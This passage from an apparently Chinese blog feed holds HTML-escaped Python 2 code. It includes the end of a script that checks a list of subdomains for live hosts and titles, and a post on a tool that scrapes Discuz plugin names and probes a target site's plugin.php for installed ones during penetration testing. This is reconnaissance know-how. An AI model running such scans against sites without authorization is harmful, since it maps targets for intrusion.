class=&quot;str&quot;&gt;&#39;http://&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39;&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt; headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt; request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;11. &lt;span class=&quot;pln&quot;&gt; response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;12. &lt;span class=&quot;pln&quot;&gt; content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;13. &lt;span class=&quot;pln&quot;&gt; pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;title&amp;gt;(.&amp;#42)&amp;lt;\/title&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;14. &lt;span class=&quot;pln&quot;&gt; items &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;15. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; len&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;16. &lt;span class=&quot;pln&quot;&gt; title &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;17. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;18. &lt;span class=&quot;pln&quot;&gt; title &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;19. &lt;span class=&quot;pln&quot;&gt; dict_list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;getcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;20. &lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dict_list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;21. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print dict_list&lt;/span&gt;22. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;23. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; isinstance&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;HTTPError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;24. &lt;span class=&quot;pln&quot;&gt; dict_list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;25. &lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dict_list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;26. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print dict_list&lt;/span&gt;27. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;28. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;pass&lt;/span&gt;29. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;30. &lt;span class=&quot;pln&quot;&gt; list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;31. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;zto.cn&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;():&lt;/span&gt;32. &lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;33. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print i&lt;/span&gt;34. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;35. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;pass&lt;/span&gt;36. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;37. &lt;span class=&quot;pln&quot;&gt; alivecheck&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;38. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; l &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;39. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【python】扫discuz插件小工具]]></title>
    <url>%2F2015%2F09%2F23%2Fe3-80-90python-e3-80-91-e6-89-abdiscuz-e6-8f-92-e4-bb-b6-e5-b0-8f-e5-b7-a5-e5-85-b7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp;为了做渗透测试的时候，方便快速寻找discuz插件，于是用python简单写了个小工具，代码写的不是很讲究，将就用1.在discuz官方爬取插件字典 &lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;4.5.6. &lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; getsigledate&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;http://addon.discuz.com/index.php?view=plugins&amp;amp;f_order=create&amp;amp;page=&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;a href=&quot;http:\/\/addon.discuz.com/\?@([0-9a-zA-Z_]&amp;#42)\.plugin&quot; class=&quot;avt&quot;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; items &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; item &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; item&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;23.24. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; getsigledate&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;字典：https://github.com/Tycx2ry/discuz-plugin-scan/blob/master/dzpluginlist.txt 2.插件扫描检测 &lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;3.4. &lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; checkplugin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;/plugin.php?id=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; 